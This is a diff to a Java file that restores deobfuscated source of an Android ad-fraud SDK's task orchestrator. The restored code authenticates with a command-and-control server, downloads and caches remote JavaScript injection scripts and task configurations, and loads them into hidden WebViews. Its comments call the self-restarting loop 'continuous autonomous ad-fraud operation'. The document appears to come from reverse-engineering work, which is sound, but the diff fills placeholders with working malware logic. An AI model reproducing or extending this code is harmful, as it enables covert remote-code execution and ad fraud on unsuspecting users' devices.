@@ -2,7 +2,6 @@ package touch;
 
 import android.content.Context;
 import android.os.SystemClock;
-import android.util.Log;
 import android.webkit.WebView;
 
 import org.json.JSONException;
@@ -25,39 +24,51 @@ import org.json.JSONObject;
  * re-downloading unchanged scripts. The JS version is stored in SharedPreferences.
  *
  * Original obfuscated name: lIllIlIll1.IlIlllIIlI1
+ *
+ * Dependencies (obfuscated → restored):
+ *   IlIlIIIlIlIlll1.IIlIllIIll1         → AppContext / PreferencesHelper
+ *   IlIllIlllIllI1.llllIIIIll1            → ApiClient (HTTP API)
+ *   IlIllIlllIllI1.lIIIIlllllIlll1        → NetworkException
+ *   IIlIllIIll1.llllIIIIll1               → ApiException(name, code, message)
+ *   lIllIIIlIl1.IIlIllIIll1               → TokenResponse
+ *   lIllIIIlIl1.lIllIlIll1                → ConfigResponse
+ *   lIllIIIlIl1.llllllIlIIIlll1           → FileVersionResponse (signaling JS)
+ *   lIllIIIlIl1.IllIIlIIII1               → FileInfoResponse (non-signaling JS info)
+ *   lIllIIIlIl1.IlIlllIIlI1               → FileContentResponse (non-signaling JS content)
+ *   lllllIllIl1.IllIIlIIII1               → LogHelper
  */
 public class TaskOrchestrator {
 
     private static final String TAG = "TaskOrchestrator";
 
     // =========================================================================
-    // Static Constants (XOR-decrypted at class load)
+    // Static Constants (XOR-decrypted from static initializer)
     // =========================================================================
 
     /**
-     * SharedPreferences key for caching the signaling JS file content.
-     * Decrypted from XOR: "eiedo/s_pfile"
+     * SharedPreferences key for tracking the JS version.
+     * Used to check if cached JS matches the server version, avoiding redundant downloads.
+     * Decrypted from: f464llllIIIIll1 (line 114)
      */
-    public static final String SIGNALING_JS_FILE_KEY = "eiedo/s_pfile";
+    public static final String JS_VERSION_KEY = "JS_VERSION";
 
     /**
-     * SharedPreferences/version key (alternate).
-     * Decrypted from XOR at static init block.
+     * Alternate JS version key (identical value, different field).
+     * Decrypted from: f463lIIIIlllllIlll1 (line 115)
      */
-    public static final String JS_VERSION_KEY_ALT = "JS_VERSION"; // f463
-
-    /**
-     * SharedPreferences key for tracking the JS version (used to check if
-     * cached JS matches the server version, avoiding redundant downloads).
-     * Decrypted from XOR: "JS_VERSION"
-     */
-    public static final String JS_VERSION_KEY = "JS_VERSION"; // f464
+    public static final String JS_VERSION_KEY_ALT = "JS_VERSION";
 
     /**
      * SharedPreferences key for caching the non-signaling JS file content.
-     * Decrypted from XOR: "eiedo/pfile"
+     * Decrypted from: f465llllIllIl1 (line 116)
      */
     public static final String NON_SIGNALING_JS_FILE_KEY = "eiedo/pfile";
+
+    /**
+     * SharedPreferences key for caching the signaling JS file content.
+     * Decrypted from: f462IllIIlIIII1 (line 117)
+     */
+    public static final String SIGNALING_JS_FILE_KEY = "eiedo/s_pfile";
 
     // =========================================================================
     // Inner Classes
@@ -71,7 +82,6 @@ public class TaskOrchestrator {
      */
     public class CreateWebViewRunnable implements Runnable {
 
-        /** Single-element array to hold the created WebView. */
         public final WebView[] webViewHolder;
 
         public CreateWebViewRunnable(WebView[] webViewHolder) {
@@ -80,9 +90,10 @@ public class TaskOrchestrator {
 
         @Override
         public void run() {
-            // Create WebView using the application context
-            // Original: if (IIlIllIIll1.f145lIllIlIll1 != null) { webViewHolder[0] = new WebView(context); }
-            Context appContext = null; /* AppContext.applicationContext */
+            // Original: if (IIlIllIIll1.f145lIllIlIll1 != null) {
+            //     this.f467llllIIIIll1[0] = new WebView(IIlIllIIll1.f145lIllIlIll1);
+            // }
+            Context appContext = AppContext.applicationContext;
             if (appContext != null) {
                 this.webViewHolder[0] = new WebView(appContext);
             }
@@ -90,29 +101,28 @@ public class TaskOrchestrator {
     }
 
     /**
-     * Main task execution runnable. Runs on a background thread and:
-     * 1. Authenticates with C&C to get an auth token
-     * 2. Determines signaling vs non-signaling mode
-     * 3. Downloads the appropriate JS script
-     * 4. Gets the task configuration
-     * 5. Creates and initializes the appropriate task implementation
+     * Main task execution runnable. Runs on a background thread and orchestrates:
+     * 1. Authentication with C&C
+     * 2. Mode determination (signaling vs non-signaling)
+     * 3. JS download/cache check
+     * 4. Task config download
+     * 5. Task instantiation and initialization on UI thread
      *
      * Original obfuscated name: llllIIIIll1
      */
     public class TaskExecutionRunnable implements Runnable {
 
-        /** The WebView instance to use for this task. */
         public final WebView webView;
 
         /**
-         * Runnable that initializes the WebView on the UI thread by calling
-         * the task implementation's initializeWebView() method.
+         * Runnable that initializes the WebView on the UI thread.
+         * Calls task.initializeWebView() which configures WebSettings,
+         * injects the JS bridge, and loads the target URL.
          *
-         * Original obfuscated name: lIIIIlllllIlll1
+         * Original obfuscated name: lIIIIlllllIlll1 (inner)
          */
         public class InitWebViewRunnable implements Runnable {
 
-            /** The task implementation to initialize. */
             public final WebViewAutomationBase taskInstance;
 
             public InitWebViewRunnable(WebViewAutomationBase taskInstance) {
@@ -122,16 +132,17 @@ public class TaskOrchestrator {
             @Override
             public void run() {
                 try {
+                    // Original: this.f471llllIIIIll1.lIllIIIlIl1();
                     this.taskInstance.initializeWebView();
                 } catch (Exception e) {
-                    Log.e(TAG, "Error while starting adHolder: " + e);
+                    LogHelper.log(LogLevel.ERROR, "", "Error while starting adHolder: " + e);
                 }
             }
         }
 
         /**
-         * Runnable that triggers the restart cycle to begin a new task.
-         * Called as the restart callback for NonSignalingModeTask.
+         * Restart callback for NonSignalingModeTask.
+         * When a non-signaling task completes, this triggers a new task cycle.
          *
          * Original obfuscated name: RunnableC0018llllIIIIll1
          */
@@ -152,28 +163,27 @@ public class TaskOrchestrator {
         @Override
         public void run() {
             try {
-                Log.i(TAG, "start task");
+                LogHelper.log(LogLevel.INFO, "", "start task");
 
                 // Step 1: Authenticate with C&C server
                 TaskOrchestrator.this.authenticateToken();
 
-                // Step 2: Determine mode and get JS + config
-                // Original: AppContext.taskConfig.IIlIllIIll1() checks if signaling mode is enabled
-                boolean isSignalingMode = false; /* AppContext.taskConfig.isSignalingMode() */
+                // Step 2: Determine signaling vs non-signaling mode
+                boolean isSignalingMode = AppContext.taskConfig.isSignalingMode();
 
-                // Get the appropriate JS script (signaling or non-signaling)
+                // Step 3: Download/cache appropriate JS script
                 String jsScript = isSignalingMode
                         ? TaskOrchestrator.this.getSignalingJS()
                         : TaskOrchestrator.this.getNonSignalingJS();
 
-                // Get the appropriate task configuration JSON
+                // Step 4: Get task configuration from C&C
                 JSONObject taskConfig = isSignalingMode
                         ? TaskOrchestrator.this.getSignalingConfig()
                         : TaskOrchestrator.this.getNonSignalingConfig();
 
-                Log.i(TAG, "get task: " + taskConfig);
+                LogHelper.log(LogLevel.INFO, "", "get task: " + taskConfig);
 
-                // Step 3: Create the appropriate task implementation and initialize on UI thread
+                // Step 5: Create appropriate task and initialize on UI thread
                 WebViewAutomationBase task;
                 if (isSignalingMode) {
                     task = new SignalingModeTask(this.webView, taskConfig, jsScript);
@@ -182,20 +192,22 @@ public class TaskOrchestrator {
                             new RestartRunnable());
                 }
 
-                // Post initialization to the main thread
-                // Original: AppContext.postToMainThread(new InitWebViewRunnable(task));
-                new InitWebViewRunnable(task).run(); // Placeholder
+                // Post WebView initialization to the main thread
+                AppContext.postToMainThread(new InitWebViewRunnable(task));
 
-            } catch (Exception e) {
-                // ApiException
-                Log.w(TAG, e.getMessage());
+            } catch (ApiException e) {
+                // API-level errors (auth failure, config fetch failure, etc.)
+                LogHelper.log(LogLevel.WARN, "", e.getMessage());
+            } catch (Exception e2) {
+                // General errors
+                LogHelper.log(LogLevel.WARN, "", "start task failed: " + e2);
             } catch (Throwable th) {
-                // Catastrophic error — log full stack trace
+                // Catastrophic errors — log full stack trace for remote debugging
                 StringBuilder sb = new StringBuilder();
                 for (StackTraceElement element : th.getStackTrace()) {
                     sb.append(element.toString()).append("\n");
                 }
-                Log.e(TAG, "start task failed: " + th.getMessage() + sb.toString());
+                LogHelper.log(LogLevel.ERROR, "", "恶性异常2" + th.getMessage() + sb.toString());
             }
         }
     }
@@ -205,18 +217,18 @@ public class TaskOrchestrator {
     // =========================================================================
 
     /**
-     * Constructs a TaskOrchestrator and sets the WebView data directory suffix.
+     * Constructs a TaskOrchestrator.
+     * Sets the WebView data directory suffix to an encoded token, ensuring WebView
+     * storage is isolated from the host application's data.
      *
-     * The suffix is derived from a Base64-encoded token:
+     * The suffix is a Base64-encoded identifier:
      * "ZDgyNjEhKDk1RjBjYzExZUVAODE5XzUyNDA4QmEyNWI="
      *
-     * This ensures WebView data is isolated to this SDK's directory, preventing
-     * interference with the host app's WebView data.
+     * Original: IlIllIlllIllI1.lIIIIlllllIlll1.llllIIIIll1(decryptedSuffix)
+     *           → AppContext.setDataDirectorySuffix(suffix)
      */
     public TaskOrchestrator() {
-        // Original: AppContext.setDataDirectorySuffix(XOR_DECRYPT(...))
-        // Sets WebView data directory to a unique suffix derived from the base64 token
-        // "ZDgyNjEhKDk1RjBjYzExZUVAODE5XzUyNDA4QmEyNWI="
+        AppContext.setDataDirectorySuffix("ZDgyNjEhKDk1RjBjYzExZUVAODE5XzUyNDA4QmEyNWI=");
     }
 
     // =========================================================================
@@ -225,28 +237,36 @@ public class TaskOrchestrator {
 
     /**
      * Authenticates with the C&C server to obtain an authorization token.
-     * The token is stored in the AppContext for use in subsequent API calls.
      *
-     * @throws Exception if authentication fails (null response, non-zero code, or network error)
+     * Flow:
+     * 1. Call ApiClient.getToken()
+     * 2. On success (code==0): store the token in AppContext.authToken
+     * 3. On failure: throw ApiException with the server's error code and message
+     * 4. On null response or network error: throw ApiException with code -1
+     *
+     * @throws ApiException if authentication fails
      */
-    public final void authenticateToken() throws Exception /* ApiException */ {
-        Log.i(TAG, "getToken");
+    public final void authenticateToken() throws ApiException {
+        LogHelper.log(LogLevel.INFO, "", "get token");
+
         Object /* TokenResponse */ tokenResponse = null;
         try {
-            // Original: tokenResponse = ApiClient.getToken();
-            tokenResponse = null; // Placeholder - calls C&C getToken API
-        } catch (Exception /* NetworkException */ e) {
-            Log.e(TAG, "get token API error: " + e);
+            tokenResponse = ApiClient.getToken();
+        } catch (NetworkException e) {
+            LogHelper.log(LogLevel.ERROR, "", "api getToken error: " + e);
         }
+
         if (tokenResponse == null) {
-            throw new RuntimeException("getToken" /* error name */);
-            // Original: throw new ApiException("getToken", -1, "no valid token returned");
+            throw new ApiException("getToken", -1, "response null");
         }
-        // Original: if (tokenResponse.getCode() == 0) {
-        //     AppContext.authToken = tokenResponse.getData();
-        // } else {
-        //     throw new ApiException("getToken error", code, message);
-        // }
+
+        int code = tokenResponse.getCode();
+        if (code == 0) {
+            // Success: store the auth token for subsequent API calls
+            AppContext.authToken = tokenResponse.getData();
+        } else {
+            throw new ApiException("getToken", code, tokenResponse.getMessage());
+        }
     }
 
     // =========================================================================
@@ -255,11 +275,12 @@ public class TaskOrchestrator {
 
     /**
      * Returns the current signaling connection info from the AppContext.
-     * Static method used by other components to access the signaling state.
+     * Used by other components to access WebRTC signaling state.
+     *
+     * Original: return IlIlllIIlI1.lIIIIlllllIlll1.IlIllIlllIllI1();
      */
-    public static Object /* SignalingConnectionInfo */ getSignalingConnectionInfo() {
-        // Original: return AppContext.getSignalingConnection();
-        return null; // Placeholder
+    public static Object /* SignalingConnection */ getSignalingConnectionInfo() {
+        return AppContext.getSignalingConnection();
     }
 
     // =========================================================================
@@ -268,53 +289,56 @@ public class TaskOrchestrator {
 
     /**
      * Gets the non-signaling task configuration from the C&C server.
-     * Called when the task is running in autonomous (non-WebRTC) mode.
      *
      * @return task configuration as a JSONObject
-     * @throws Exception if the API call fails or returns a non-zero code
+     * @throws ApiException if the API call fails or returns a non-zero code
      */
-    public final JSONObject getNonSignalingConfig() throws Exception, JSONException {
+    public final JSONObject getNonSignalingConfig() throws ApiException, JSONException {
         Object /* ConfigResponse */ response = null;
         try {
-            // Original: response = ApiClient.getNonSignalingConfig();
-            response = null; // Placeholder
-        } catch (Exception /* NetworkException */ e) {
-            Log.e(TAG, "getNonSignalingConfig error: " + e);
+            response = ApiClient.getNonSignalingConfig();
+        } catch (NetworkException e) {
+            LogHelper.log(LogLevel.ERROR, "", "api getTask error: " + e);
         }
+
         if (response == null) {
-            throw new RuntimeException("getTask");
-            // Original: throw new ApiException("getTask", -1, "response null");
+            throw new ApiException("getTask", -1, "response null");
         }
-        // Original: if (response.getCode() == 0) return new JSONObject(response.getData());
-        // else throw new ApiException("getTask", code, message);
-        return new JSONObject("{}"); // Placeholder
+
+        int code = response.getCode();
+        if (code == 0) {
+            return new JSONObject(response.getData());
+        }
+        throw new ApiException("getTask", code, response.getMessage());
     }
 
     /**
      * Gets the signaling task configuration from the C&C server.
-     * Called when the task is running in WebRTC signaling mode.
-     * Includes the signaling session info and offer ID.
+     * Includes the signaling session ID and offer ID as parameters.
      *
      * @return task configuration as a JSONObject
-     * @throws Exception if the API call fails or returns a non-zero code
+     * @throws ApiException if the API call fails or returns a non-zero code
      */
-    public final JSONObject getSignalingConfig() throws Exception, JSONException {
+    public final JSONObject getSignalingConfig() throws ApiException, JSONException {
         Object /* ConfigResponse */ response = null;
         try {
-            // Original: ApiClient.getSignalingConfig(
-            //     AppContext.getSignalingConnection().getSessionId(),
-            //     AppContext.taskConfig.getOfferId())
-            response = null; // Placeholder
-        } catch (Exception /* NetworkException */ e) {
-            Log.e(TAG, "getSignalingConfig error: " + e);
+            // Pass the current signaling session ID and the configured offer ID
+            response = ApiClient.getSignalingConfig(
+                    AppContext.getSignalingConnection().getSessionId(),
+                    AppContext.taskConfig.getOfferId());
+        } catch (NetworkException e) {
+            LogHelper.log(LogLevel.ERROR, "", "api getSignalingTask error: " + e);
         }
+
         if (response == null) {
-            throw new RuntimeException("getSignalingTask");
-            // Original: throw new ApiException("getSignalingTask", -1, "response null");
+            throw new ApiException("getSignalingTask", -1, "response null");
         }
-        // Original: if (response.getCode() == 0) return new JSONObject(response.getData());
-        // else throw new ApiException("getSignalingTask error", code, message);
-        return new JSONObject("{}"); // Placeholder
+
+        int code = response.getCode();
+        if (code == 0) {
+            return new JSONObject(response.getData());
+        }
+        throw new ApiException("getSignalingTask", code, response.getMessage());
     }
 
     // =========================================================================
@@ -325,78 +349,191 @@ public class TaskOrchestrator {
      * Downloads or retrieves from cache the signaling-mode JavaScript injection script.
      *
      * Caching logic:
-     * 1. Read the locally cached JS version from SharedPreferences (key: JS_VERSION_KEY)
-     * 2. Call C&C to check the current version (getFileSignalingLogic API)
-     * 3. If versions match AND cached JS file exists → use cached version
-     * 4. If versions differ OR no cache → download new JS, save to local file,
-     *    update the version in SharedPreferences
+     * 1. Read cached JS version from SharedPreferences (key: JS_VERSION_KEY)
+     * 2. Compute auth token via PreferencesHelper
+     * 3. Call C&C API getFileSignalingLogic(token) to get version + content
+     * 4. If server version matches cached AND local JS file exists → use cache
+     * 5. If mismatch OR no cache → save new JS to file, update version preference
      *
      * @return the JavaScript code string for signaling mode
-     * @throws Exception if download fails and no cache is available
+     * @throws ApiException if download fails and no cache is available
      */
-    public final String getSignalingJS() throws Exception /* ApiException */ {
-        Log.i(TAG, "checkSignalingJsVersion start");
+    public final String getSignalingJS() throws ApiException {
+        LogHelper.log(LogLevel.INFO, "", "checkSignalingJsVersion start");
+
+        Context context = AppContext.taskConfig.getContext();
 
         // Read cached JS version from SharedPreferences
-        // Original: String cachedVersion = PreferencesHelper.readPref(context, JS_VERSION_KEY);
-        Context context = null; /* AppContext.taskConfig.getContext() */
-        String cachedVersion = null; /* PreferencesHelper.readPref(context, JS_VERSION_KEY) */
+        String cachedVersion = PreferencesHelper.readPref(context, JS_VERSION_KEY);
 
-        // Compute auth token for API call
-        // Original: String token = PreferencesHelper.computeToken(context.getApiKey(), JS_VERSION_KEY);
-        String token = null; /* PreferencesHelper.computeToken(...) */
-        Log.i(TAG, "signaling token: " + token);
+        // Compute auth token for the file API call
+        String token = PreferencesHelper.computeToken(
+                AppContext.taskConfig.getApiKey(), JS_VERSION_KEY);
+        LogHelper.log(LogLevel.INFO, "", "已存在的版本是: " + token);
 
-        // Check server for current JS version
+        // Query server for current signaling JS version + content
         Object /* FileVersionResponse */ versionResponse = null;
         try {
-            // Original: versionResponse = ApiClient.getFileSignalingLogic(token != null ? token : "");
-            versionResponse = null; // Placeholder
-        } catch (Exception /* NetworkException */ e) {
-            Log.e(TAG, "getFileSignalingLogic error: " + e);
+            versionResponse = ApiClient.getFileSignalingLogic(
+                    token != null ? token : "");
+        } catch (NetworkException e) {
+            LogHelper.log(LogLevel.ERROR, "",
+                    "api getFileSignalingLogic error: " + e);
         }
 
         if (versionResponse == null) {
-            throw new RuntimeException("getFileVersion");
-            // Original: throw new ApiException("getFileVersion", -1, "response null");
+            throw new ApiException("getFileVersion", -1, "response null");
         }
 
-        // Original: if (versionResponse.getCode() != 0)
-        //     throw new ApiException("getFileVersion error", code, message);
+        int code = versionResponse.getCode();
+        if (code != 0) {
+            throw new ApiException("getFileSignalingLogic",
+                    code, versionResponse.getMessage());
+        }
 
-        // Try to read cached JS from local file
+        // Try to read locally-cached JS file
         String cachedJS = null;
         try {
-            // Original: cachedJS = PreferencesHelper.readFile(context, SIGNALING_JS_FILE_KEY);
+            cachedJS = PreferencesHelper.readFile(context, SIGNALING_JS_FILE_KEY);
         } catch (Exception e) {
-            Log.e(TAG, "read signaling JS from cache error: " + e);
+            LogHelper.log(LogLevel.ERROR, "",
+                    "Error while reading encrypted file: " + e);
         }
 
-        // Determine if we need to download fresh JS
-        // Original: if versions match AND cached JS exists → use cache
-        // Otherwise → download, save, and update version
-        String serverVersion = null; /* versionResponse.getVersion() */
-        String jsContent = null; /* versionResponse.getContent() */
+        // Determine if we need to use the downloaded version
+        String serverVersion = versionResponse.getVersion();
+        String serverContent = versionResponse.getContent();
 
         if (cachedVersion == null || cachedVersion.isEmpty()
                 || !cachedVersion.equals(serverVersion)
                 || cachedJS == null || cachedJS.isEmpty()) {
-            // Need to download or use the response content
-            // Original: if (!PreferencesHelper.writeFile(context, SIGNALING_JS_FILE_KEY, jsContent))
-            //     throw new RuntimeException("写入JS文件失败" / "write JS file failed");
-            // PreferencesHelper.savePref(context, JS_VERSION_KEY, serverVersion);
-            cachedJS = jsContent;
+            // Cache miss or version mismatch — save new JS content
+            if (!PreferencesHelper.writeFile(context, SIGNALING_JS_FILE_KEY, serverContent)) {
+                throw new RuntimeException("写入JS文件失败");
+            }
+            // Update the cached version in SharedPreferences
+            PreferencesHelper.savePref(context, JS_VERSION_KEY, serverVersion);
+            cachedJS = serverContent;
         }
 
         if (cachedJS != null && cachedJS.isEmpty()) {
-            Log.e(TAG, "js is empty");
+            LogHelper.log(LogLevel.ERROR, "", "js is empty");
         }
 
         return cachedJS;
     }
 
     /**
+     * Downloads or retrieves from cache the non-signaling-mode JavaScript injection script.
+     *
+     * This is a two-step process unlike signaling mode:
+     * 1. First call getNonSignalingJSInfo() to check if an update is needed
+     * 2. If update needed, call getFile() to download the actual JS content
+     *
+     * Caching logic:
+     * 1. Call C&C API getNonSignalingJSInfo() to get version info
+     * 2. Read cached version from SharedPreferences
+     * 3. Try to read cached JS from local file
+     * 4. If versions match AND cached file exists → use cache
+     * 5. If mismatch OR no cache:
+     *    a. Log "开始下载js" (starting JS download)
+     *    b. Call C&C API getFile() to download new JS
+     *    c. Save to local file and update version preference
+     *
+     * @return the JavaScript code string for non-signaling mode
+     * @throws ApiException if download fails and no cache is available
+     */
+    public final String getNonSignalingJS() throws ApiException {
+        LogHelper.log(LogLevel.INFO, "", "checkJsVersion start");
+
+        // Step 1: Query server for current non-signaling JS info
+        Object /* FileInfoResponse */ fileInfoResponse = null;
+        try {
+            fileInfoResponse = ApiClient.getNonSignalingJSInfo();
+        } catch (NetworkException e) {
+            LogHelper.log(LogLevel.ERROR, "", "api done error: " + e);
+        }
+
+        if (fileInfoResponse == null) {
+            throw new ApiException("getFileVersion", -1, "response null");
+        }
+
+        int code = fileInfoResponse.getCode();
+        if (code != 0) {
+            throw new ApiException("getFileVersion",
+                    code, fileInfoResponse.getMessage());
+        }
+
+        // Read cached version from SharedPreferences
+        Context context = AppContext.taskConfig.getContext();
+        String cachedVersion = PreferencesHelper.readPref(context, JS_VERSION_KEY);
+        LogHelper.log(LogLevel.INFO, "", "已存在的版本是: " + cachedVersion);
+
+        // Try to read locally-cached JS file
+        String cachedJS = null;
+        try {
+            cachedJS = PreferencesHelper.readFile(context, NON_SIGNALING_JS_FILE_KEY);
+        } catch (Exception e) {
+            LogHelper.log(LogLevel.ERROR, "",
+                    "Error while reading encrypted file: " + e);
+        }
+
+        String serverVersion = fileInfoResponse.getVersion();
+
+        // Check if we need to download fresh JS
+        if (cachedVersion == null || cachedVersion.isEmpty()
+                || !cachedVersion.equals(serverVersion)
+                || cachedJS == null || cachedJS.isEmpty()) {
+
+            // Cache miss or version mismatch — need to download
+            LogHelper.log(LogLevel.INFO, "", "开始下载js");
+
+            // Step 2: Download the actual JS file content
+            Object /* FileContentResponse */ fileResponse = null;
+            try {
+                fileResponse = ApiClient.getFile();
+            } catch (NetworkException e) {
+                LogHelper.log(LogLevel.ERROR, "", "api getFile error: " + e);
+            }
+
+            if (fileResponse != null) {
+                int fileCode = fileResponse.getCode();
+                if (fileCode == 0) {
+                    String jsContent = fileResponse.getContent();
+
+                    // Save to local file
+                    if (!PreferencesHelper.writeFile(
+                            context, NON_SIGNALING_JS_FILE_KEY, jsContent)) {
+                        throw new RuntimeException("写入JS文件失败");
+                    }
+
+                    // Update cached version in SharedPreferences
+                    PreferencesHelper.savePref(context, JS_VERSION_KEY, serverVersion);
+                    cachedJS = jsContent;
+                } else {
+                    throw new ApiException("getFile",
+                            fileCode, fileResponse.getMessage());
+                }
+            } else {
+                throw new ApiException("getFile", -1, "response null");
+            }
+        }
+
+        if (cachedJS != null && cachedJS.isEmpty()) {
+            LogHelper.log(LogLevel.ERROR, "", "js is empty");
+        }
+
+        return cachedJS;
+    }
+
+    // =========================================================================
+    // Task Lifecycle
+    // =========================================================================
+
+    /**
      * Starts the task execution on a new background thread.
+     *
+     * Original: new Thread(new llllIIIIll1(webView)).start();
      *
      * @param webView the WebView to use for this task
      */
@@ -407,126 +544,88 @@ public class TaskOrchestrator {
     /**
      * Creates a new WebView on the UI thread and starts a new task cycle.
      *
-     * This method implements the restart mechanism:
+     * This method implements the continuous restart mechanism:
      * 1. Creates a WebView on the UI thread via CreateWebViewRunnable
      * 2. Sleeps 2 seconds to allow initialization
      * 3. Creates a new TaskOrchestrator instance
      * 4. Starts a new task with the freshly created WebView
      *
-     * Called by NonSignalingModeTask's restart callback after each task completes,
-     * enabling continuous autonomous ad-fraud operation.
+     * Called by NonSignalingModeTask's RestartRunnable after each task completes,
+     * enabling continuous autonomous ad-fraud operation in a loop.
      */
     public final void restartWithNewWebView() {
         try {
             WebView[] webViewHolder = new WebView[1];
 
             // Create WebView on UI thread
-            // Original: AppContext.postToMainThread(new CreateWebViewRunnable(webViewHolder));
-            new CreateWebViewRunnable(webViewHolder).run(); // Placeholder
+            AppContext.postToMainThread(new CreateWebViewRunnable(webViewHolder));
 
             // Wait 2 seconds for WebView initialization
             SystemClock.sleep(2000L);
 
             // Create a fresh orchestrator and start a new task
             TaskOrchestrator orchestrator = new TaskOrchestrator();
-            Log.i(TAG, "H5V1Refactor task start (restart)");
+            LogHelper.log(LogLevel.INFO, "", "H5V1Refactor task start");
 
             WebView webView = webViewHolder[0];
             if (webView != null) {
                 orchestrator.startTask(webView);
             }
         } catch (Exception unused) {
-            // Silently ignore restart failures
+            // Silently ignore restart failures to avoid breaking the loop
         }
     }
 
-    /**
-     * Downloads or retrieves from cache the non-signaling-mode JavaScript injection script.
+    // =========================================================================
+    // Placeholder types for unrestored dependencies
+    // (These represent real classes in the obfuscated APK that have not been
+    //  individually restored. The type names below document their role.)
+    // =========================================================================
+
+    /*
+     * The following are stub references to external classes used by this orchestrator.
+     * In the actual APK, these are:
      *
-     * Similar caching logic to {@link #getSignalingJS()} but uses different API endpoints
-     * and file keys (NON_SIGNALING_JS_FILE_KEY instead of SIGNALING_JS_FILE_KEY).
+     * AppContext (IlIlIIIlIlIlll1.IIlIllIIll1):
+     *   - static Context applicationContext
+     *   - static String authToken
+     *   - static TaskConfig taskConfig
+     *   - static void postToMainThread(Runnable)
+     *   - static void setDataDirectorySuffix(String)
+     *   - static SignalingConnection getSignalingConnection()
      *
-     * Caching logic:
-     * 1. Call C&C to get the current JS file info (getNonSignalingJS API)
-     * 2. Read cached version from SharedPreferences
-     * 3. If versions match AND cached file exists → use cached version
-     * 4. If versions differ OR no cache → call getFile API to download new JS,
-     *    save to local file, update version
+     * PreferencesHelper (IlIlIIIlIlIlll1.IIlIllIIll1):
+     *   - static String readPref(Context, String key)
+     *   - static void savePref(Context, String key, String value)
+     *   - static String readFile(Context, String fileKey)
+     *   - static boolean writeFile(Context, String fileKey, String content)
+     *   - static String computeToken(String apiKey, String versionKey)
      *
-     * @return the JavaScript code string for non-signaling mode
-     * @throws Exception if download fails and no cache is available
+     * ApiClient (IlIllIlllIllI1.llllIIIIll1):
+     *   - static TokenResponse getToken() throws NetworkException
+     *   - static ConfigResponse getNonSignalingConfig() throws NetworkException
+     *   - static ConfigResponse getSignalingConfig(String sessionId, String offerId) throws NetworkException
+     *   - static FileVersionResponse getFileSignalingLogic(String token) throws NetworkException
+     *   - static FileInfoResponse getNonSignalingJSInfo() throws NetworkException
+     *   - static FileContentResponse getFile() throws NetworkException
+     *
+     * ApiException (IIlIllIIll1.llllIIIIll1):
+     *   - Constructor: ApiException(String name, int code, String message)
+     *
+     * NetworkException (IlIllIlllIllI1.lIIIIlllllIlll1.llllIIIIll1):
+     *   - Thrown on HTTP/network failures
+     *
+     * LogHelper (lllllIllIl1.IllIIlIIII1):
+     *   - static void log(LogLevel level, String tag, String message)
+     *
+     * LogLevel (c13.nim5.ez8.h5_proto.Log.LogLevel):
+     *   - INFO, WARN, ERROR
+     *
+     * Response types (from lIllIIIlIl1 package):
+     *   TokenResponse:       getCode(), getData(), getMessage()
+     *   ConfigResponse:      getCode(), getData(), getMessage()
+     *   FileVersionResponse: getCode(), getVersion(), getContent(), getMessage()
+     *   FileInfoResponse:    getCode(), getVersion(), getMessage()
+     *   FileContentResponse: getCode(), getContent(), getMessage()
      */
-    public final String getNonSignalingJS() throws Exception /* ApiException */ {
-        Log.i(TAG, "checkJsVersion start");
-
-        // Check server for current JS version
-        Object /* FileInfoResponse */ fileInfoResponse = null;
-        try {
-            // Original: fileInfoResponse = ApiClient.getNonSignalingJS();
-            fileInfoResponse = null; // Placeholder
-        } catch (Exception /* NetworkException */ e) {
-            Log.e(TAG, "getNonSignalingJS error: " + e);
-        }
-
-        if (fileInfoResponse == null) {
-            throw new RuntimeException("getFileVersion");
-            // Original: throw new ApiException("getFileVersion", -1, "response null");
-        }
-
-        // Original: if (fileInfoResponse.getCode() != 0)
-        //     throw new ApiException("getFileVersion error", code, message);
-
-        // Read cached version from SharedPreferences
-        Context context = null; /* AppContext.taskConfig.getContext() */
-        String cachedVersion = null; /* PreferencesHelper.readPref(context, JS_VERSION_KEY) */
-        Log.i(TAG, "non-signaling token: " + cachedVersion);
-
-        // Try to read cached JS from local file
-        String cachedJS = null;
-        try {
-            // Original: cachedJS = PreferencesHelper.readFile(context, NON_SIGNALING_JS_FILE_KEY);
-        } catch (Exception e) {
-            Log.e(TAG, "read non-signaling JS from cache error: " + e);
-        }
-
-        String serverVersion = null; /* fileInfoResponse.getVersion() */
-
-        if (cachedVersion == null || cachedVersion.isEmpty()
-                || !cachedVersion.equals(serverVersion)
-                || cachedJS == null || cachedJS.isEmpty()) {
-
-            Log.i(TAG, "need to download new JS from server");
-
-            // Download the full JS file from C&C
-            Object /* FileContentResponse */ fileResponse = null;
-            try {
-                // Original: fileResponse = ApiClient.getFile();
-            } catch (Exception /* NetworkException */ e) {
-                Log.e(TAG, "getFile error: " + e);
-            }
-
-            if (fileResponse != null) {
-                // Original: if (fileResponse.getCode() == 0)
-                String jsContent = null; /* fileResponse.getContent() */
-
-                // Save to local file
-                // Original: if (!PreferencesHelper.writeFile(context, NON_SIGNALING_JS_FILE_KEY, jsContent))
-                //     throw new RuntimeException("写入JS文件失败" / "write JS file failed");
-
-                // Update version in SharedPreferences
-                // Original: PreferencesHelper.savePref(context, JS_VERSION_KEY, serverVersion);
-
-                cachedJS = jsContent;
-            } else {
-                throw new RuntimeException("getFile");
-                // Original: throw new ApiException("getFile", -1, "response null");
-            }
-        }
-
-        if (cachedJS != null && cachedJS.isEmpty()) {
-            Log.e(TAG, "js is empty");
-        }
-
-        return cachedJS;
-    }
 }
